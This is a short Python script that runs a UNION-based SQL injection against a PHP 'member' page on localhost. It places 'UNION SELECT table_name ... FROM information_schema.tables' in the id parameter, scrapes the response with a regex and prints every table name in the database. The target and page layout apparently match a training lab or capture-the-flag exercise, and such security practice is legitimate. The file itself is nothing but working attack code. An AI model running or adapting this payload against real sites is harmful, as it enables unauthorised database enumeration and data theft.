from requests import get
import re

def main():
    # ALL TABLES
    id = "0 UNION SELECT table_name, null FROM information_schema.tables"
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    tableNames = re.findall(r"First name:\s*([^\n<]+)", response.text)

    for name in tableNames:
        print(name)

if __name__ == "__main__":
	main()